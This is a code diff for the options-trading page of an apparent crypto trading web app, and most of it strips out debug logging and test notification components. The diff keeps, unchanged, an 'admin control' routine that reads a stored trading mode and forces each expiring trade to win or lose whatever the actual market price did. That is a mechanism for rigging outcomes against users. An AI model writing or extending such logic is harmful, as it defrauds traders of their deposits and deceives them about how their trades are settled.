@@ -5,8 +5,6 @@ import { MobileBottomNav } from "../components/ui/mobile-bottom-nav";
 import TradingViewWidget from "../components/TradingViewWidget";
 import TradeNotification from "../components/TradeNotification";
 import TradeOverlay from "../components/TradeOverlay";
-import { NotificationDebug } from "../components/NotificationDebug";
-import { ForceNotificationTest } from "../components/ForceNotificationTest";
 import { playTradeSound } from "../utils/sounds";
 import { useQuery, useQueryClient } from '@tanstack/react-query';
 import { useAuth } from '../hooks/useAuth';
@@ -15,7 +13,6 @@ import { useIsMobile } from '../hooks/use-mobile';
 import { apiRequest } from '../lib/queryClient';
 
 import type { MarketData } from '../../../shared/schema';
-import '../utils/mobile-notification-debug';
 
 interface ActiveTrade {
   id: string;
@@ -95,16 +92,11 @@ export default function OptionsPage() {
 
   // Mobile trade modal function
   const showMobileTradeModal = (data: any) => {
-    console.log('📱 MOBILE MODAL: Showing mobile trade modal with data:', data);
-    console.log('📱 MOBILE MODAL: Setting mobileTradeData to:', data);
-    console.log('📱 MOBILE MODAL: Setting isMobileModalOpen to true');
     setMobileTradeData(data);
     setIsMobileModalOpen(true);
-    console.log('📱 MOBILE MODAL: Modal state updated');
 
     // Force body scroll prevention
     document.body.style.overflow = 'hidden';
-    console.log('📱 MOBILE MODAL: Body scroll disabled');
   };
 
   // Load trade history from server on component mount and persist locally
@@ -343,26 +335,7 @@ export default function OptionsPage() {
     balance = 0;
   }
 
-  // ENHANCED Debug logging for balance sync - Only log when user is available
-  if (user) {
-    console.log('🔍 OPTIONS PAGE BALANCE DEBUG:', {
-      user: user?.id,
-      userBalances,
-      finalBalance: balance,
-      'userBalances?.USDT?.available': userBalances?.USDT?.available,
-      'Array.isArray(userBalances)': Array.isArray(userBalances),
-      'Array.isArray(userBalances?.balances)': Array.isArray(userBalances?.balances),
-      'typeof userBalances': typeof userBalances,
-      'userBalances keys': userBalances ? Object.keys(userBalances) : 'null'
-    });
-  } else {
-    console.log('🔍 OPTIONS PAGE: User not authenticated, skipping balance debug');
-  }
 
-  // ALERT: Show balance on screen for debugging
-  if (typeof window !== 'undefined') {
-    console.log(`🚨 OPTIONS PAGE: Displaying balance ${balance} USDT`);
-  }
 
   // Handle WebSocket balance updates for real-time sync
   useEffect(() => {
@@ -652,69 +625,15 @@ export default function OptionsPage() {
         completedAt: new Date().toISOString()
       };
 
-      console.log('🎯 SETTING COMPLETED TRADE:', tradeWithTimestamp);
-      console.log('🎯 MOBILE CHECK AT COMPLETION:', {
-        isMobile,
-        windowWidth: window.innerWidth,
-        userAgent: navigator.userAgent.substring(0, 50)
-      });
-
       setCompletedTrade(tradeWithTimestamp);
       localStorage.setItem('completedTrade', JSON.stringify(tradeWithTimestamp));
-
-      console.log('🎯 COMPLETE TRADE: Set completedTrade state:', tradeWithTimestamp);
-      console.log('🎯 COMPLETE TRADE: Mobile detected:', window.innerWidth < 768);
-      console.log('🎯 COMPLETE TRADE: isMobile hook value:', isMobile);
-
-      // FORCE NOTIFICATION TEST - Add immediate visual feedback
-      console.log('🚨 FORCING NOTIFICATION TEST - Creating immediate visual indicator');
-      const testIndicator = document.createElement('div');
-      testIndicator.style.cssText = `
-        position: fixed;
-        top: 20px;
-        right: 20px;
-        background: red;
-        color: white;
-        padding: 10px;
-        border-radius: 5px;
-        z-index: 999999;
-        font-weight: bold;
-      `;
-      testIndicator.textContent = `TRADE COMPLETED: ${tradeWithTimestamp.status.toUpperCase()} - ${tradeWithTimestamp.amount} USDT`;
-      document.body.appendChild(testIndicator);
-      setTimeout(() => testIndicator.remove(), 5000);
-
-      // FORCE REACT STATE UPDATE - Try multiple approaches
-      console.log('🔄 FORCING REACT STATE UPDATE');
-
-      // Approach 1: Force re-render with setTimeout
-      setTimeout(() => {
-        console.log('🔄 DELAYED STATE UPDATE - Setting completedTrade again');
-        setCompletedTrade({ ...tradeWithTimestamp });
-      }, 100);
-
-      // Approach 2: Force component update
-      setTimeout(() => {
-        console.log('🔄 FORCING COMPONENT UPDATE');
-        // Force a state change that will trigger re-render
-        setActiveTrades(prev => [...prev]);
-      }, 200);
-
-      // MOBILE FIX: Show custom modal with exact design
-      console.log('📱 MOBILE CHECK: Window width:', window.innerWidth, 'Is mobile:', window.innerWidth < 768);
-      console.log('📱 MOBILE CHECK: User agent:', navigator.userAgent);
-      console.log('📱 MOBILE CHECK: isMobile hook:', isMobile);
 
       // Use multiple mobile detection methods
       const isMobileWidth = window.innerWidth < 768;
       const isMobileUserAgent = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
       const shouldShowMobileModal = isMobileWidth || isMobile || isMobileUserAgent;
 
-      console.log('📱 MOBILE CHECK: Width check:', isMobileWidth, 'UserAgent check:', isMobileUserAgent, 'Hook check:', isMobile);
-      console.log('📱 MOBILE CHECK: Final decision - should show mobile modal:', shouldShowMobileModal);
-
       // DISABLE OLD MOBILE MODAL - Use TradeNotification component instead
-      console.log('📱 MOBILE CHECK: Using TradeNotification component for all devices');
 
       // Don't trigger the old mobile modal anymore - let TradeNotification handle it
 
@@ -761,38 +680,19 @@ export default function OptionsPage() {
                      (trade.direction === 'down' && priceChange < 0);
 
             // 🎯 DYNAMIC TRADING CONTROL SYSTEM - FETCH FROM SERVER
-            console.log('🎯 DYNAMIC TRADING CONTROL: Fetching user trading mode from server...');
-
             const userId = user?.id || 'superadmin-001';
             const username = user?.username || 'superadmin';
-
-            console.log(`🎯 DYNAMIC CONTROL: User ${username} (${userId})`);
-            console.log(`🎯 ORIGINAL RESULT: ${won ? 'WIN' : 'LOSE'} (price change: ${priceChange.toFixed(2)})`);
 
             // Use real-time trading mode from multiple sources for maximum reliability
             const storedTradingMode = localStorage.getItem('currentTradingMode') || 'normal';
             const tradingMode = currentTradingMode || storedTradingMode;
 
-            console.log(`🎯 REAL-TIME MODE CHECK:`, {
-              currentState: currentTradingMode,
-              localStorage: storedTradingMode,
-              finalMode: tradingMode,
-              originalResult: won ? 'WIN' : 'LOSE'
-            });
-
             // Apply admin control immediately - no server delay!
             if (tradingMode === 'lose') {
-              console.log('🎯 IMMEDIATE CONTROL: FORCING TRADE TO LOSE!');
               won = false;
             } else if (tradingMode === 'win') {
-              console.log('🎯 IMMEDIATE CONTROL: FORCING TRADE TO WIN!');
               won = true;
-            } else {
-              console.log('🎯 NORMAL MODE: Using actual market result');
             }
-
-            console.log(`🎯 FINAL RESULT: ${won ? 'WIN' : 'LOSE'} (Applied Mode: ${tradingMode.toUpperCase()})`);
-            console.log('🚀 INSTANT ADMIN CONTROL APPLICATION - ZERO DELAY!');
 
             // Complete the trade asynchronously with forced result
             console.log('🎯 CALLING completeTrade with:', { trade: trade.id, won, finalPrice });
@@ -851,7 +751,6 @@ export default function OptionsPage() {
       activeTrades.forEach(trade => {
         const timeRemaining = Math.max(0, Math.ceil((trade.endTime - now) / 1000));
         if (timeRemaining === 0 && trade.status === 'active') {
-          console.log(`🎯 TIMER: Trade ${trade.id} expired! Triggering completion check...`);
           // Force a re-render by updating a dummy state
           setCountdown(prev => prev);
         }
@@ -1100,34 +999,7 @@ export default function OptionsPage() {
             </div>
           </div>
 
-          {/* DEBUG: Manual Test Button */}
-          <div className="px-4 py-2">
-            <div className="bg-red-900 border border-red-500 rounded-lg p-3 mb-2">
-              <h3 className="text-red-300 font-bold text-sm mb-2">🔧 DEBUG: Manual Notification Test</h3>
-              <button
-                onClick={() => {
-                  console.log('🧪 MANUAL TEST: Creating test notification');
-                  const testTrade = {
-                    id: 'test-' + Date.now(),
-                    direction: 'up' as const,
-                    amount: 100,
-                    entryPrice: 50000,
-                    currentPrice: 51000,
-                    status: 'won' as const,
-                    payout: 110,
-                    profitPercentage: 10,
-                    completedAt: new Date().toISOString()
-                  };
-                  console.log('🧪 MANUAL TEST: Setting test trade:', testTrade);
-                  setCompletedTrade(testTrade);
-                  localStorage.setItem('completedTrade', JSON.stringify(testTrade));
-                }}
-                className="bg-red-600 hover:bg-red-700 text-white px-3 py-2 rounded text-sm font-bold w-full"
-              >
-                🧪 Force Test Notification
-              </button>
-            </div>
-          </div>
+
 
           {/* Mobile Options Trading Interface */}
           <div className="px-4 py-4 space-y-4">
@@ -1664,22 +1536,7 @@ export default function OptionsPage() {
               ) : (
                 <>Sign in to view balance and start trading</>
               )}
-              {process.env.NODE_ENV === 'development' && (
-                <button
-                  onClick={() => {
-                    console.log('🔧 Debug Info:', {
-                      currentPrice,
-                      activeTrades: activeTrades.length,
-                      balance,
-                      selectedAmount,
-                      selectedDuration
-                    });
-                  }}
-                  className="ml-4 text-xs bg-blue-600 px-2 py-1 rounded"
-                >
-                  Debug
-                </button>
-              )}
+
             </div>
 
             {/* Buy Up / Buy Down Buttons */}
@@ -2157,7 +2014,6 @@ export default function OptionsPage() {
         <div
           className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center p-5 z-[999999]"
           onClick={() => {
-            console.log('📱 MOBILE MODAL: Background clicked, closing modal');
             setIsMobileModalOpen(false);
             document.body.style.overflow = 'auto';
           }}
@@ -2171,7 +2027,6 @@ export default function OptionsPage() {
               <div className="text-lg font-bold">{mobileTradeData.symbol}</div>
               <button
                 onClick={() => {
-                  console.log('📱 MOBILE MODAL: Close button clicked, closing modal');
                   setIsMobileModalOpen(false);
                   document.body.style.overflow = 'auto';
                 }}
@@ -2223,11 +2078,7 @@ export default function OptionsPage() {
         </div>
       )}
 
-      {/* Debug Component - Remove in production */}
-      <NotificationDebug />
 
-      {/* Force Notification Test - Remove in production */}
-      <ForceNotificationTest />
     </div>
   );
   } catch (error) {
